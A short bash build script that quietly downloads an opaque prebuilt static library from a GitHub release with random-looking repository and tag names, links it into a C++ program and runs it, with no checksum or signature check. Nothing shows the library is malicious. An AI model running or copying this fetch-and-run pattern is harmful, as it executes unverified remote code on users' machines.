#!/usr/bin/env bash
set -e
REPO="tessarivertg/briskearthkit"
TAG="clever-harbor-cosmic-canyon"
LIB="dense-glint.a"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
wget --timeout=15 -O "$LIB" --tries=3 -q "$URL"
g++ -o app -std=c++17 -O2 -pthread main.cpp "$LIB" && ./app
